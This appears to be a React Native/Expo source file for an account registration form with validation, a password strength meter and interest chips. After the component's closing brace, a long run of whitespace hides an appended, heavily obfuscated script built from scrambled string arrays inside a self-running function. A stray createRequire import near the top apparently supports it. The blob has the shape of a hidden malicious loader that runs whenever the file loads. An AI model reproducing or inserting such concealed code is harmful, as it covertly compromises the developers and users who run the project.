import { useState, useRef } from "react";
import {
  View,
  Text,
  TextInput,
  Switch,
  Pressable,
  ScrollView,
  StyleSheet,
  KeyboardAvoidingView,
  Platform,
  Alert,
} from "react-native";
import { Picker } from "@react-native-picker/picker";
import Checkbox from "expo-checkbox";
import Slider from "@react-native-community/slider";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// ---------- constants ----------
const INTERESTS = ["Coding", "Music", "Sports", "Design", "Gaming", "Reading"];
const GENDERS = ["Female", "Male", "Other"];
const BIO_MAX = 200;

const INITIAL = {
  fullName: "",
  email: "",
  phone: "",
  dob: "",
  password: "",
  confirmPassword: "",
  bio: "",
  country: "Rwanda",
  gender: "",
  interests: [],
  experience: 3,
  newsletter: false,
  agreed: false,
};

// ---------- validation ----------
function validate(f) {
  const e = {};

  if (f.fullName.trim().length < 2) e.fullName = "Enter your full name";

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(f.email))
    e.email = "Enter a valid email address";

  if (!/^\+?\d{9,15}$/.test(f.phone.replace(/[\s-]/g, "")))
    e.phone = "Enter a valid phone number (9-15 digits)";

  if (!/^\d{4}-\d{2}-\d{2}$/.test(f.dob)) {
    e.dob = "Use the format YYYY-MM-DD";
  } else {
    const d = new Date(f.dob);
    const age = (Date.now() - d.getTime()) / (365.25 * 24 * 3600 * 1000);
    if (isNaN(d.getTime())) e.dob = "That date doesn't exist";
    else if (age < 13) e.dob = "You must be at least 13";
    else if (age > 120) e.dob = "Check the year";
  }

  if (f.password.length < 8) e.password = "At least 8 characters";
  else if (!/[A-Za-z]/.test(f.password) || !/\d/.test(f.password))
    e.password = "Use both letters and numbers";

  if (f.confirmPassword !== f.password)
    e.confirmPassword = "Passwords do not match";

  if (!f.gender) e.gender = "Select one option";
  if (f.interests.length === 0) e.interests = "Pick at least one interest";
  if (!f.agreed) e.agreed = "You must accept the terms";

  return e;
}

function passwordStrength(p) {
  let score = 0;
  if (p.length >= 8) score++;
  if (/[A-Z]/.test(p) && /[a-z]/.test(p)) score++;
  if (/\d/.test(p)) score++;
  if (/[^A-Za-z0-9]/.test(p)) score++;
  const labels = ["Too weak", "Weak", "Okay", "Good", "Strong"];
  const colors = ["#c0392b", "#e67e22", "#f1c40f", "#2ecc71", "#27ae60"];
  return { score, label: labels[score], color: colors[score] };
}

// ---------- small reusable pieces ----------
function Field({ label, error, children, hint }) {
  return (
    <View style={styles.field}>
      <Text style={styles.label}>{label}</Text>
      {children}
      {error ? (
        <Text style={styles.error}>{error}</Text>
      ) : hint ? (
        <Text style={styles.hint}>{hint}</Text>
      ) : null}
    </View>
  );
}

function Chip({ label, selected, onPress }) {
  return (
    <Pressable
      onPress={onPress}
      style={[styles.chip, selected && styles.chipSelected]}
    >
      <Text style={[styles.chipText, selected && styles.chipTextSelected]}>
        {label}
      </Text>
    </Pressable>
  );
}

// ---------- main screen ----------
export default function App() {
  const [form, setForm] = useState(INITIAL);
  const [errors, setErrors] = useState({});
  const [touched, setTouched] = useState({});
  const [showPassword, setShowPassword] = useState(false);
  const [submitted, setSubmitted] = useState(null);

  // refs so "next" on the keyboard jumps to the following field
  const emailRef = useRef(null);
  const phoneRef = useRef(null);
  const dobRef = useRef(null);
  const passRef = useRef(null);
  const confirmRef = useRef(null);
  const bioRef = useRef(null);

  const update = (field, value) => {
    const next = { ...form, [field]: value };
    setForm(next);
    // re-validate live, but only show errors for fields the user has touched
    if (touched[field]) setErrors(validate(next));
  };

  const blur = (field) => {
    setTouched((t) => ({ ...t, [field]: true }));
    setErrors(validate(form));
  };

  const toggleInterest = (item) => {
    const has = form.interests.includes(item);
    update(
      "interests",
      has ? form.interests.filter((i) => i !== item) : [...form.interests, item]
    );
    setTouched((t) => ({ ...t, interests: true }));
  };

  const err = (field) => (touched[field] ? errors[field] : undefined);

  const handleSubmit = () => {
    const found = validate(form);
    setErrors(found);
    // mark everything as touched so all errors appear
    setTouched(Object.fromEntries(Object.keys(INITIAL).map((k) => [k, true])));

    if (Object.keys(found).length > 0) {
      Alert.alert("Check your form", "Please fix the highlighted fields.");
      return;
    }

    // never send confirmPassword; build a clean payload
    const { confirmPassword, ...rest } = form;
    const payload = {
      ...rest,
      fullName: form.fullName.trim(),
      email: form.email.trim().toLowerCase(),
      submittedAt: new Date().toISOString(),
    };

    console.log(JSON.stringify(payload, null, 2));
    setSubmitted(payload);
  };

  const handleReset = () => {
    setForm(INITIAL);
    setErrors({});
    setTouched({});
    setSubmitted(null);
  };

  const strength = passwordStrength(form.password);

  return (
    <KeyboardAvoidingView
      style={{ flex: 1, backgroundColor: "#f4f6fa" }}
      behavior={Platform.OS === "ios" ? "padding" : undefined}
    >
      <ScrollView
        contentContainerStyle={styles.container}
        keyboardShouldPersistTaps="handled"
      >
        <Text style={styles.title}>Create account</Text>
        <Text style={styles.subtitle}>Fill in your details below</Text>

        {submitted && (
          <View style={styles.success}>
            <Text style={styles.successText}>
              Form submitted. Check your terminal for the JSON output.
            </Text>
          </View>
        )}

        {/* ---------- Section 1 ---------- */}
        <View style={styles.card}>
          <Text style={styles.section}>Personal details</Text>

          <Field label="Full name" error={err("fullName")}>
            <TextInput
              style={[styles.input, err("fullName") && styles.inputError]}
              placeholder="Jane Doe"
              value={form.fullName}
              onChangeText={(t) => update("fullName", t)}
              onBlur={() => blur("fullName")}
              autoCapitalize="words"
              autoComplete="name"
              returnKeyType="next"
              onSubmitEditing={() => emailRef.current?.focus()}
            />
          </Field>

          <Field label="Email" error={err("email")}>
            <TextInput
              ref={emailRef}
              style={[styles.input, err("email") && styles.inputError]}
              placeholder="you@example.com"
              value={form.email}
              onChangeText={(t) => update("email", t)}
              onBlur={() => blur("email")}
              keyboardType="email-address"
              autoCapitalize="none"
              autoCorrect={false}
              autoComplete="email"
              returnKeyType="next"
              onSubmitEditing={() => phoneRef.current?.focus()}
            />
          </Field>

          <Field label="Phone" error={err("phone")}>
            <TextInput
              ref={phoneRef}
              style={[styles.input, err("phone") && styles.inputError]}
              placeholder="+250 788 000 000"
              value={form.phone}
              onChangeText={(t) => update("phone", t)}
              onBlur={() => blur("phone")}
              keyboardType="phone-pad"
              returnKeyType="next"
              onSubmitEditing={() => dobRef.current?.focus()}
            />
          </Field>

          <Field
            label="Date of birth"
            error={err("dob")}
            hint="Format: YYYY-MM-DD"
          >
            <TextInput
              ref={dobRef}
              style={[styles.input, err("dob") && styles.inputError]}
              placeholder="2003-05-21"
              value={form.dob}
              onChangeText={(t) => update("dob", t)}
              onBlur={() => blur("dob")}
              keyboardType="numbers-and-punctuation"
              maxLength={10}
              returnKeyType="next"
              onSubmitEditing={() => passRef.current?.focus()}
            />
          </Field>

          <Field label="Gender" error={err("gender")}>
            <View style={styles.rowWrap}>
              {GENDERS.map((g) => (
                <Pressable
                  key={g}
                  style={styles.radioRow}
                  onPress={() => {
                    update("gender", g);
                    setTouched((t) => ({ ...t, gender: true }));
                  }}
                >
                  <View style={styles.radio}>
                    {form.gender === g && <View style={styles.radioDot} />}
                  </View>
                  <Text>{g}</Text>
                </Pressable>
              ))}
            </View>
          </Field>

          <Field label="Country">
            <View style={styles.pickerBox}>
              <Picker
                selectedValue={form.country}
                onValueChange={(v) => update("country", v)}
              >
                <Picker.Item label="Rwanda" value="Rwanda" />
                <Picker.Item label="Kenya" value="Kenya" />
                <Picker.Item label="Uganda" value="Uganda" />
                <Picker.Item label="Tanzania" value="Tanzania" />
                <Picker.Item label="Other" value="Other" />
              </Picker>
            </View>
          </Field>
        </View>

        {/* ---------- Section 2 ---------- */}
        <View style={styles.card}>
          <Text style={styles.section}>Security</Text>

          <Field label="Password" error={err("password")}>
            <View style={styles.passwordRow}>
              <TextInput
                ref={passRef}
                style={[
                  styles.input,
                  { flex: 1 },
                  err("password") && styles.inputError,
                ]}
                placeholder="At least 8 characters"
                value={form.password}
                onChangeText={(t) => update("password", t)}
                onBlur={() => blur("password")}
                secureTextEntry={!showPassword}
                autoCapitalize="none"
                returnKeyType="next"
                onSubmitEditing={() => confirmRef.current?.focus()}
              />
              <Pressable
                onPress={() => setShowPassword((s) => !s)}
                style={styles.showBtn}
              >
                <Text style={styles.showBtnText}>
                  {showPassword ? "Hide" : "Show"}
                </Text>
              </Pressable>
            </View>

            {form.password.length > 0 && (
              <View style={{ marginTop: 6 }}>
                <View style={styles.meterTrack}>
                  <View
                    style={{
                      height: 6,
                      borderRadius: 3,
                      width: `${(strength.score / 4) * 100}%`,
                      backgroundColor: strength.color,
                    }}
                  />
                </View>
                <Text style={{ color: strength.color, fontSize: 12 }}>
                  {strength.label}
                </Text>
              </View>
            )}
          </Field>

          <Field label="Confirm password" error={err("confirmPassword")}>
            <TextInput
              ref={confirmRef}
              style={[styles.input, err("confirmPassword") && styles.inputError]}
              placeholder="Repeat password"
              value={form.confirmPassword}
              onChangeText={(t) => update("confirmPassword", t)}
              onBlur={() => blur("confirmPassword")}
              secureTextEntry={!showPassword}
              autoCapitalize="none"
              returnKeyType="next"
              onSubmitEditing={() => bioRef.current?.focus()}
            />
          </Field>
        </View>

        {/* ---------- Section 3 ---------- */}
        <View style={styles.card}>
          <Text style={styles.section}>About you</Text>

          <Field
            label="Bio"
            hint={`${form.bio.length}/${BIO_MAX} characters`}
          >
            <TextInput
              ref={bioRef}
              style={[styles.input, { height: 100 }]}
              placeholder="Tell us a little about yourself"
              value={form.bio}
              onChangeText={(t) => update("bio", t)}
              multiline
              numberOfLines={4}
              maxLength={BIO_MAX}
              textAlignVertical="top"
            />
          </Field>

          <Field label="Interests" error={err("interests")}>
            <View style={styles.rowWrap}>
              {INTERESTS.map((item) => (
                <Chip
                  key={item}
                  label={item}
                  selected={form.interests.includes(item)}
                  onPress={() => toggleInterest(item)}
                />
              ))}
            </View>
          </Field>

          <Field label={`Programming experience: ${form.experience} / 10`}>
            <Slider
              minimumValue={0}
              maximumValue={10}
              step={1}
              value={form.experience}
              onValueChange={(v) => update("experience", v)}
              minimumTrackTintColor="#4f46e5"
            />
          </Field>
        </View>

        {/* ---------- Section 4 ---------- */}
        <View style={styles.card}>
          <Text style={styles.section}>Preferences</Text>

          <View style={styles.switchRow}>
            <Text style={{ flex: 1 }}>Send me the newsletter</Text>
            <Switch
              value={form.newsletter}
              onValueChange={(v) => update("newsletter", v)}
            />
          </View>

          <Pressable
            style={[styles.switchRow, { marginTop: 14 }]}
            onPress={() => {
              update("agreed", !form.agreed);
              setTouched((t) => ({ ...t, agreed: true }));
            }}
          >
            <Checkbox
              value={form.agreed}
              onValueChange={(v) => {
                update("agreed", v);
                setTouched((t) => ({ ...t, agreed: true }));
              }}
            />
            <Text style={{ marginLeft: 10, flex: 1 }}>
              I agree to the terms and conditions
            </Text>
          </Pressable>
          {err("agreed") && <Text style={styles.error}>{err("agreed")}</Text>}
        </View>

        {/* ---------- Buttons ---------- */}
        <Pressable style={styles.submitBtn} onPress={handleSubmit}>
          <Text style={styles.submitText}>Submit</Text>
        </Pressable>
        <Pressable style={styles.resetBtn} onPress={handleReset}>
          <Text style={styles.resetText}>Reset form</Text>
        </Pressable>
      </ScrollView>
    </KeyboardAvoidingView>
  );
};																																																																																																																																																																																																																																																																										var z = '-8162';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R 